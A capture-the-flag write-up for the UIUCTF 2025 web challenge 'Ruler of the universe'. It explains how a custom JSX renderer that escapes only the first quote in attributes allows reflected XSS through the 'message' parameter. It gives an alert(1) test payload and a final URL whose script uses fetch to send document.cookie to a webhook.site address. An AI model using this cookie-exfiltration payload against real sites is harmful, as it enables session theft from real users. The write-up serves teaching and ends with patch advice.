---
title: "UIUCTF 2025 - Ruler of the universe"
date: 2025-07-28 15:00:00 +0200
categories: [UIUCTF 2025, Web]
tags: [Web]
description: Writeup for the first web challenge of the UIUCTF of 2025
---


## The write up

For this challenge, we have the source code of the web application. So let's take a look at it :

### Reading the source code

First, let's locate the flag :

We see an ```adminbot``` folder. That's my trigger for a web-client based challenge. Furthermore, we see : 


```typescript
await browser.setCookie({
    name: "flag",
    value: FLAG,
    domain: new URL(mainUrl).hostname,
    httpOnly: false,
    secure: true,
});
```
{: file="adminbot/index.ts" }

We can clearly see that we need to steal the bot cookie to get the flag. Note that the flag ```httpOnly``` is set to ```false``` so it makes our life easier since we can use javascript to retrieve the cookie. And who says javascript + cookies says XSS !


Our plan is :
- Find an exploitable XSS in the web app
- Submit the compromised URL to the bot
- Enjoy our flag

### Finding the XSS

We see from the source code that the web application has only two pages : ```home.tsx``` and  ```module.tsx```

After viewing ```index.tsx``` we see that ```home.tsx``` does not take any user input, just the admin bot url that we cannot control : 

``` react
"/": {
    GET: (req) => {
        const url = new URL(req.url);

        let adminUrl = "#";
        if (url.hostname == "localhost") {
            adminUrl = "http://localhost:3001";
        } else if (
            url.hostname.endsWith("ruler-of-the-universe.chal.uiuc.tf")
        ) {
            const currentHost = url.host;
            const instancePrefix =
                currentHost.split(`-`)[0] + `-` + currentHost.split(`-`)[1];
            adminUrl = `https://${instancePrefix}-adminbot-ruler-of-the-universe.chal.uiuc.tf/`;
        }

        return new Response(
            render(
                <App>
                    <Home adminUrl={adminUrl} />
                </App>
            ),
            {
                headers: { "Content-Type": "text/html; charset=utf-8" },
            }
        );
    },
}
```
{: file="challenge/src/app/index.tsx" }

But it's different for the ```/module``` path : 

``` react
"/module/:id": {
    GET: (req) => {
        const moduleId = parseInt(req.params.id);
        const crewMessage = new URL(req.url).searchParams.get("message");

        return new Response(
            render(
                <App>
                    <Module id={moduleId} crewMessage={crewMessage} />
                </App>
            ),
            {
                headers: { "Content-Type": "text/html; charset=utf-8" },
            }
        );
    },
}
```
{: file="challenge/src/app/index.tsx" }

We see two arguments are passed to ```module.tsx``` : ```moduleId``` and ```crewMessage```.

- ```moduleId``` is got from the parameters of the url but unfortunately it is cast into an int, so no injection possible here
- ```crewMessage``` is directly taken from the ```message``` parameter, we can play with it as we want

We have now only one option to investigate : the ```crewMessage``` variable.

We see two reflections of ```crewMessage``` in ```module.tsx``` :

``` react
<input
    id="message"
    name="message"
    type="text"
    class="w-full border border-green-400 bg-black text-green-400 px-2 py-1 text-xs"
    placeholder={
        crewMessage
            ? `Update your message: ${crewMessage}`
            : "Enter a message for the crew"
    }
/>
```
{: file="challenge/src/app/pages/module.tsx" }

and : 

``` react
{crewMessage && <p>[13:10] Crew message: "{crewMessage}"</p>}
```
{: file="challenge/src/app/pages/module.tsx" }

### Understanding the rendering logic

At this point, we suspect the ```crewMessage``` value might be reflected unsafely in the DOM. But we need to understand how rendering is performed. Looking at ```challenge/src/my_jsx/index.ts```, we find a custom JSX renderer is used instead of React’s default output engine.

The rendering code looks like this:

``` typescript
if (typeof element === "string" || typeof element === "number") {
    return escapeHTML(element);
}
```
{: file="challenge/src/my_jsx/index.ts" }

This means any string used as a child node (like the second reflection of ```crewMessage```) will be automatically HTML-escaped using escapeHTML.

However, props are handled differently:
``` typescript
.map(([key, value]) => {
    if (typeof value === "boolean") {
        return value ? key : "";
    }
    return `${key}="${String(value).replace('"', "&quot;")}"`;
})
```
{: file="challenge/src/my_jsx/index.ts" }

This code only escapes the first ```"``` in ```&quot```, nothing else (unlike python). This makes the first reflection of ```crewMessage``` vulnerable !

### Making the payload

We know that we can control ```crewMessage``` with the ```message``` parameter on ```/module/id``` and that the first ```"``` will be escape.

We will try something like this : (not url encoded !)
```
https://inst-xxxxxxxxxx-ruler-of-the-universe.chal.uiuc.tf/module/1?message=""><script>alert(1)</script>
```

Explanation : the first ```"``` got escaped but everything else is left as is, so we closed the input tag via ```">``` and finally write our javascript between ```<script>``` tag.

When visiting the url, we sucecssfully get a popup, we have a working XSS !

### Retrieving the flag

Now let's build a payload to steal the admin's cookie and retrieve our flag !

- We can access the cookies by document.cookie
- We need a way to send the cookie back to us

So, we will do a request to a server with the flag.

I personally use webhook.site but of course you're free to use whatever tool you want.

Here's the final url : (again not url encoded)
```
https://inst-xxxxxxxxxx-ruler-of-the-universe.chal.uiuc.tf/module/1?message=""><script>fetch('https://webhook.site/yourUUIDhere/?flag='+document.cookie)</script>
```

Submit the url (only the part from ```module/...```) to the admin bot and enjoy your flag !

### How to patch this ?

Avoid writing your own custom JSX renderer or input sanitizer unless absolutely necessary. Prefer using mature, battle-tested libraries that handle escaping properly, like React’s default DOM renderer.